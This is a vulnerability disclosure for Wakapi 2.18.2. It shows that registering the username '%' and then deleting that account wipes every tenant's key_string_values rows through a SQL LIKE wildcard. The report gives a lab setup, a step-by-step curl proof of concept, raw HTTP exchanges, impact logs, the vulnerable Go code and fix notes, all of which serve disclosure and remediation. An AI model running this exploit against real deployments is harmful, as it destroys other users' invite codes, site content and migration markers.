### Vulnerability details

**Official website / Product:** https://wakapi.dev / https://github.com/muety/wakapi

**Repository:** muety/wakapi (stars at selection: 4467)

**Vulnerability type:** SQLi (SQL LIKE wildcard injection → cross-tenant full wipe of `key_string_values` / migration-marker corruption)

**Vulnerability versions:** 2.18.2 (image `ghcr.io/muety/wakapi:2.18.2`; source audit master tip `aba6a4475a797fd4325fc3126c1df33d2b00ff85`); `ValidateUsername` / `DeleteWildcardTx` still present on current HEAD

**Vulnerability URL / Parameter:** `POST /settings` — form field `action=delete_account`; prerequisite: ability to register username `%` (`ValidateUsername` does not reject LIKE metacharacters)

**Complex:** yes

### Verification procedure

1. Recreate the lab (original `labs/wakapi-r9a7` was torn down per hygiene). Write this `docker-compose.yml` and start it:

```yaml
services:
  wakapi:
    image: ghcr.io/muety/wakapi:2.18.2
    container_name: wakapi-r9a7
    ports:
      - "18907:3000"
    environment:
      WAKAPI_DB_TYPE: sqlite3
      WAKAPI_DB_NAME: /data/wakapi.db
      WAKAPI_PASSWORD_SALT: "r9a7labsalt"
      WAKAPI_LISTEN_IPV4: "0.0.0.0"
      WAKAPI_INSECURE_COOKIES: "true"
      WAKAPI_ALLOW_SIGNUP: "true"
      WAKAPI_PUBLIC_URL: "http://127.0.0.1:18907"
      ENVIRONMENT: prod
    volumes:
      - wakapi-r9a7-data:/data
    restart: unless-stopped

volumes:
  wakapi-r9a7-data:
```

```bash
docker compose up -d
# wait until healthy: 0.0.0.0:18907->3000/tcp
```

2. Register the first user (becomes admin). Account: `admin` / `Admin123!`, email `admin@example.com`:

```bash
curl -s -c /tmp/wakapi-admin.ck -b /tmp/wakapi-admin.ck -X POST 'http://127.0.0.1:18907/signup' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'username=admin' \
  --data-urlencode 'email=admin@example.com' \
  --data-urlencode 'password=Admin123!' \
  --data-urlencode 'password_repeat=Admin123!' \
  --data-urlencode 'location=UTC' -o /dev/null -w 'admin_signup:%{http_code}\n'
curl -s -c /tmp/wakapi-admin.ck -b /tmp/wakapi-admin.ck -X POST 'http://127.0.0.1:18907/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=Admin123!' -o /dev/null -w 'admin_login:%{http_code}\n'
```

3. As admin, generate an invite code (writes `key_string_values.invite_*` for cross-tenant impact observation):

```bash
curl -s -b /tmp/wakapi-admin.ck -X POST 'http://127.0.0.1:18907/settings' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'action=generate_invite' -o /tmp/wakapi-invite.html
# HTML contains http://127.0.0.1:18907/signup?invite=<CODE>
```

4. Register an attacker account with username **`%`** and log in. Password: `Pctuser1!`, email `pct@example.com` (no invite needed while signup is open; otherwise attach the invite from step 3):

```bash
curl -s -c /tmp/wakapi-pct.ck -b /tmp/wakapi-pct.ck -X POST 'http://127.0.0.1:18907/signup' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'username=%' \
  --data-urlencode 'email=pct@example.com' \
  --data-urlencode 'password=Pctuser1!' \
  --data-urlencode 'password_repeat=Pctuser1!' \
  --data-urlencode 'location=UTC' -o /dev/null -w 'signup_pct:%{http_code}\n'
curl -s -c /tmp/wakapi-pct.ck -b /tmp/wakapi-pct.ck -X POST 'http://127.0.0.1:18907/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'username=%' \
  --data-urlencode 'password=Pctuser1!' -o /dev/null -w 'login_pct:%{http_code}\n'
```

5. Count KV rows before delete (should be >0, including migration markers, `imprint`, `invite_*`):

```bash
docker cp wakapi-r9a7:/data/wakapi.db /tmp/wakapi-before.db
sqlite3 /tmp/wakapi-before.db 'SELECT COUNT(*) FROM key_string_values;'
sqlite3 /tmp/wakapi-before.db "SELECT key FROM key_string_values WHERE key LIKE 'invite_%' OR key='imprint' LIMIT 10;"
```

Expected output (original lab; `invite_*` suffix changes with the code from step 3):

```text
30
imprint
invite_431689df
```

6. As the `%` user, `POST /settings` with body `action=delete_account` (full packet below; replace Cookie with `wakapi_auth` / `wakapi_session` from step 4).

7. Observe impact (recount KV after delete; reuse the invite from step 3; check imprint; restart and watch migration replay):

```bash
docker cp wakapi-r9a7:/data/wakapi.db /tmp/wakapi-after.db
sqlite3 /tmp/wakapi-after.db 'SELECT COUNT(*) FROM key_string_values;'
# Expected: 0

INVITE=$(grep -oE 'invite=[0-9a-f]+' /tmp/wakapi-invite.html | head -1 | cut -d= -f2)
curl -s -D- -o /tmp/wakapi-invite-reuse.body -X POST 'http://127.0.0.1:18907/signup' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "username=victim2" \
  --data-urlencode "email=victim2@example.com" \
  --data-urlencode "password=Victim12!" \
  --data-urlencode "password_repeat=Victim12!" \
  --data-urlencode "location=UTC" \
  --data-urlencode "invite_code=${INVITE}"
# Expected: HTTP/1.1 403 Forbidden; body contains Error: Invite code invalid or expired

curl -s 'http://127.0.0.1:18907/imprint'
# Expected: failed to load content

docker restart wakapi-r9a7
docker logs wakapi-r9a7 2>&1 | grep -F 'successfully deleted project label summary items'
# Expected: that INFO line (destructive migrations re-run after markers were wiped)
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified; Cookie is the `%` session from the original verify — replace with cookies from step 4 when replaying):

```http
POST /settings HTTP/1.1
Host: 127.0.0.1:18907
User-Agent: Mozilla/5.0 wakapi-r9a7-poc
Accept: text/html,application/xhtml+xml
Content-Type: application/x-www-form-urlencoded
Origin: http://127.0.0.1:18907
Referer: http://127.0.0.1:18907/settings
Cookie: wakapi_auth=MTc5MzUzNjk1NXxmWlNOZVVaVlBtaENsR2FZRlJVMWw3R2piajdWMnJmZUFiRjVXek9xTzN0dUVjUk5qazNYOHNWT1R3R3U5LTRnUlJnS0ZOST18CoCjfSJxB4CBX-X1ijCpKvaRkuHthtlK5Dpd9V8ZYSs=; wakapi_session=MTc5MzUzNjk1NXwtZkowcHIxVVpTcDMwQ1dZZ2ZIWXNIUWhIbWdsTF9ENmZocFB6NXJlTVZXLUpQZFhiSWVwX19od1FDaF9jRlA0TzZpUHh0b0d5V0Y1NWViN3JnYnlOemR4eS1zQmJDQVpWMXNEcGFUbC1RcnZiWW9zZWVoUVRNczdDX1c2bWI2d2VJRkJmeUg5SzlQdk1qeDlQVWpJeU9oQ0pIYWpFUGU4eHZ1TExPYz18uUzju7V-_X2GESbTog3K_DTzpb8tDd-tw68yOtWBGnI=
Connection: close
Content-Length: 21

action=delete_account
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 302 Found
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' https: data:; form-action 'self' *.stripe.com; block-all-mixed-content;
Cross-Origin-Opener-Policy: same-origin
Location: /
Set-Cookie: wakapi_session=MTc5MzUzNjk1NXwtTEVzeVpTYjlMMGJObkhvdjhFOUJzcm5CanF3a0ZESzFhZG5wNDQ4UF9QVmVNdURGVV9wSEFYUDZaTFRUSHdoLUJlZ3dNc2dfUWFhUlF0cmdZVXdFdEtfYWhUenRjcThnNFFPSUlPQ2pPeXRvbXhYZHM5ZllzTHFrS01HbXZTSGgtWkdKb1ZrVWFtb295RGNnemRWclM3WUk5akV4MmN2cGdpQU1wNTd3UExpRVo1SnNrNndOUTJDbHpDc2JhRVpfMU94THd4MjdZS1lQY2JBMVBoSWxkODhaNzV3bGh1V2tVbGJucGRNWS1naTJJV2VidjZVdUtPYzZiZXpPX0V2a3VpNjlMZ2U3ZF91MDk4PXwu4ksWsqnzMp5ojZeygeM-QHK_S9GFIimMe0NAwagkCw==; Path=/; Expires=Tue, 01 Dec 2026 12:42:35 GMT; Max-Age=2592000; HttpOnly; SameSite=Lax
Set-Cookie: wakapi_auth=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Date: Sun, 01 Nov 2026 12:42:35 GMT
Content-Length: 0
Connection: close

```

Cross-tenant invite reuse after wipe (admin invite `431689df` invalidated):

```http
POST /signup HTTP/1.1
Host: 127.0.0.1:18907
Content-Type: application/x-www-form-urlencoded
Connection: close

username=victim2&email=victim2@example.com&password=Victim12!&password_repeat=Victim12!&location=UTC&invite_code=431689df
```

```http
HTTP/1.1 403 Forbidden
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' https: data:; form-action 'self' *.stripe.com; block-all-mixed-content;
Cross-Origin-Opener-Policy: same-origin
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Ratelimit-Limit: 5
X-Ratelimit-Remaining: 2
X-Ratelimit-Reset: 1793540524
Date: Sun, 01 Nov 2026 12:42:37 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked


Error: Invite code invalid or expired
```

Verification result notes:

After deleting the account whose username is `%`, `key_string_values` went from 30 rows to **0** (including admin `invite_431689df`, `imprint`, and all migration markers). Reusing that invite returned **403 Invite code invalid or expired**; `/imprint` showed “failed to load content”. After container restart, logs showed `successfully deleted project label summary items` and other migrations re-running, proving wiped markers caused destructive migrations to execute again. Original lab impact excerpt:

```text
=== before delete (key_string_values canaries) ===
imprint
invite_431689df
latest_total_time
latest_total_users
before_kv_count=30

=== after POST /settings action=delete_account as user '%' ===
after_kv_count=0
after_keys: (empty)
after_users:
admin|admin@example.com

=== cross-tenant invite reuse (admin invite 431689df) ===
HTTP/1.1 403 Forbidden
Error: Invite code invalid or expired

=== imprint after wipe ===
failed to load content

=== second wipe reproduction ===
before2=33
after2=0

=== docker restart after wipe: migrations re-executed (markers gone) ===
INFO successfully deleted project label summary items
INFO 👉 Listening for HTTP... ✅ address="0.0.0.0:3000"

Sink chain:
1) models/user.go ValidateUsername allows '%'
2) services/user.go Delete -> DeleteWildcardTx(fmt.Sprintf("*_%s", user.ID), tx)
3) repositories/key_value.go DeleteWildcardTx: WHERE key LIKE strings.ReplaceAll(pattern,'*','%')
   user.ID='%' => pattern '*_%' => LIKE '%%' => DELETE all key_string_values
```

Lab accounts used during verify:

| Role | Username | Password | Email |
|------|----------|----------|-------|
| Admin (first signup) | `admin` | `Admin123!` | `admin@example.com` |
| Attacker | `%` | `Pctuser1!` | `pct@example.com` |

Password pepper / `WAKAPI_PASSWORD_SALT`: `r9a7labsalt`.

### Vulnerability analysis

On account deletion, the server builds wildcard pattern `*_<userid>` and replaces `*` with SQL LIKE `%` before deleting. `ValidateUsername` only rejects empty strings, spaces, and the literal `current`, and **allows LIKE metacharacters such as `%` / `_` as usernames**. When `userid == "%"`, pattern `*_%` becomes LIKE `%%`, matching and deleting every row in `key_string_values`. That table stores migration completion markers (`hasRun`), site imprint, other users' invite codes `invite_*`, and per-user import bookmarks. Any attacker who can self-register (or redeem an invite) can therefore cause cross-tenant integrity loss and trigger migration replay (including delete-side effects) on service restart.

Trigger / sink source (full path and line numbers):

```go
# File: models/user.go
# Lines: 271-273
func ValidateUsername(username string) bool {
	return len(username) >= 1 && username != "current" && !strings.Contains(username, " ")
}
```

```go
# File: services/user.go
# Lines: 364-380
func (srv *UserService) Delete(user *models.User) error {
	srv.FlushUserCache(user.ID)
	user.ReportsWeekly = false
	srv.notifyUpdate(user)
	return srv.repository.RunInTx(func(tx *gorm.DB) error {
		if err := srv.repository.DeleteTx(user, tx); err != nil {
			return err
		}
		if err := srv.keyValueService.DeleteWildcardTx(fmt.Sprintf("*_%s", user.ID), tx); err != nil {
			return err
		}
		srv.notifyDelete(user)
		return nil
	})
}
```

```go
# File: repositories/key_value.go
# Lines: 89-92
func (r *KeyValueRepository) DeleteWildcardTx(pattern string, tx *gorm.DB) error {
	return tx.
		Where(utils.QuoteSql(r.db, "%s like ?", "key"), strings.ReplaceAll(pattern, "*", "%")).
		Delete(&models.KeyStringValue{}).Error
}
```

### Fix notes

1. Tighten `ValidateUsername` to a safe charset (e.g. `^[a-zA-Z0-9_-]+$`), explicitly rejecting `%`, `_`, `*`, quotes, etc.
2. Escape LIKE metacharacters in user-controlled fragments used by `DeleteWildcardTx` / `ReplaceKeySuffix`, or switch to exact suffix / keyed deletes.
3. Do not store migration markers / global config in the same wildcard-deletable KV path reachable from user account deletion.
